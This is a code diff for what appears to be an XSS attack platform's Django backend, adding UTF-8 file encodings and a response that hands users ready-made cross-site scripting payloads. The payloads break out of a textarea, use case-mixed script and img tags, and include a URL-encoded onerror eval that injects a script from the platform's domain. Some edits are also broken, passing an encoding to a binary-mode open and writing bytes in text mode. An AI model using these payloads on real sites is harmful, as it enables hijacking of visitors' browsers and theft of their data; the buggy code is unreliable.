@@ -4,6 +4,7 @@ from ClassCongregation import ErrorLog,GetJavaScriptFilePath,randoms
 import json
 import base64
 import re
+from config import cross_site_script_uses_domain_names
 from Web.Workbench.LogRelated import UserOperationLogRecord,RequestLogRecord
 
 def GetIp(request):
@@ -81,7 +82,7 @@ def GenerateProject(request):#用来生成项目，并且生成文件和用户�
                     if not QueryJavaScriptSaveFileNameValidity:#如果不冲突的话跳出循环
                         break
                 JavaScriptSaveRoute = GetJavaScriptFilePath().Result() + JavaScriptSaveFileName  # 获得保存路径
-                with open(JavaScriptSaveRoute, 'wb') as f:
+                with open(JavaScriptSaveRoute, 'wb',encoding='UTF-8') as f:
                     f.write(base64.b64decode(str(JavaScriptFileData).encode('utf-8')))#文件内容还要加密
                 CrossSiteScriptProject().Write(file_name=JavaScriptSaveFileName,uid=Uid,project_name=ProjectName)#写到数据库表中
                 return JsonResponse({'message': JavaScriptSaveFileName, 'code': 200, })#返回创建好的文件名
@@ -169,7 +170,7 @@ def ModifyProject(request):  # 用来修改XSS项目中的数据
 
                 if AuthorityCheck:#判断文件是属于该用户,如果属于的话就对文件进行修改
                     JavaScriptFilePath=GetJavaScriptFilePath().Result() + ProjectAssociatedFileName#获取文件位置
-                    with open(JavaScriptFilePath, 'w+') as f:
+                    with open(JavaScriptFilePath, 'w+',encoding='UTF-8') as f:
                         f.write(base64.b64decode(str(ProjectAssociatedFileData).encode('utf-8')))  # 文件内容还要解密
                     return JsonResponse({'message': "文件内容覆盖成功~", 'code': 200, })
                 else:
@@ -200,8 +201,13 @@ def QueryProjectInfo(request):  # 查询项目中详细信息
                 AuthorityCheck = CrossSiteScriptProject().AuthorityCheck(uid=Uid,file_name=ProjectAssociatedFileName)  # 用来校检CrossSiteScript数据库中文件名和UID相对应
                 if AuthorityCheck:#判断文件是属于该用户,如果属于的话就对文件进行修改
                     JavaScriptFilePath=GetJavaScriptFilePath().Result() + ProjectAssociatedFileName#获取文件位置
-                    ReadFileData=open(JavaScriptFilePath, 'r').read()#读取文件内容
-                    return JsonResponse({'message': base64.b64encode(str(ReadFileData).encode('utf-8')).decode('utf-8'), 'code': 200, })
+                    ReadFileData=open(JavaScriptFilePath, 'r',encoding='UTF-8').read()#读取文件内容
+                    return JsonResponse({'message': {"project_associated_file_data":base64.b64encode(str(ReadFileData).encode('utf-8')).decode('utf-8'),
+                                                     "the_first_use":"""</tExtArEa>'"><sCRiPt sRC=//"""+cross_site_script_uses_domain_names+"/s/"+ProjectAssociatedFileName+"></sCrIpT>",
+                                                     "the_second_use":"<sCRiPt/SrC=//"+cross_site_script_uses_domain_names+"/s/"+ProjectAssociatedFileName+">",
+                                                     "the_third_use":"<img sRC=//"+cross_site_script_uses_domain_names+"/s/"+ProjectAssociatedFileName+">",
+                                                     "exploit_path":"//"+cross_site_script_uses_domain_names+"/s/"+ProjectAssociatedFileName,
+                                                     "coding_exploit":"""</tEXtArEa>'"><img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22%2F%2F"""+cross_site_script_uses_domain_names+"%2Fs%2F"+ProjectAssociatedFileName+"%22%2BMath.random%28%29%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//>"}, 'code': 200, })
                 else:
                     return JsonResponse({'message': "你没有查询这个项目的权限哦宝贝~", 'code': 404, })
             else:
